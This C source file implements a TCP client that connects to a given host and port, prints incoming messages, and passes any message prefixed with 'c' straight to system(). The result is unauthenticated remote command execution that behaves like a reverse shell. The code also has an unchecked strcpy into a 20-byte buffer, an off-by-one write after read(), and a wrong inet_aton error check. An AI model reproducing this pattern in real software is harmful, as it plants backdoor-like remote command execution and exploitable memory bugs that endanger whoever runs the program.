#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>

#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>


#define DEFAULT_SERVER_PORT 5432
#define MAX_MSG_SIZE 1024

int main(int argc, char *argv[])
{
    int port = DEFAULT_SERVER_PORT;
    int client_sockfd;
    struct sockaddr_in server_addr;
    int addrlen = sizeof(struct sockaddr_in);
    char message[MAX_MSG_SIZE + 1];

    char hostip[20];

    //parse command line arguments
    if(argc == 2){
        strcpy(hostip, argv[1]);
    } else if(argc == 4){
        if(!strcmp("-p", argv[1])){
            sscanf(argv[2], "%d", &port);
            strcpy(hostip, argv[3]);
        } else{
            printf("Usage: %s [-p PORT] HOST-IP-ADDRESS\n", argv[0]);
            exit(0);
        }
    } else{
        printf("Usage: %s [-p PORT] HOST-IP-ADDRESS\n", argv[0]);
        exit(0);
    }

    bzero(&server_addr, addrlen);
    client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if(inet_aton(hostip, &server_addr.sin_addr) < 0){
        perror("inet_aton");
        exit(1);
    }

    //connect to server
    if(connect(client_sockfd, (struct sockaddr *) &server_addr, addrlen) < 0){
        perror("connect");
        exit(1);
    }

    //use different message[0] for messages
    //message[0] == X => termination
    //message[0] == m => normal message
    //message[0] == c => command
    while(1){
        printf(">> ");
        fflush(stdout);
        int bytes = read(client_sockfd, message, MAX_MSG_SIZE + 1);
        if(bytes <= 0 || message[0] == 'X')
            break;

        message[bytes] = '\0';
        printf("%s", message+1);
        if(message[0] == 'c' && strlen(message+1))//command
            system(message+1);
    }

    return 0;
}
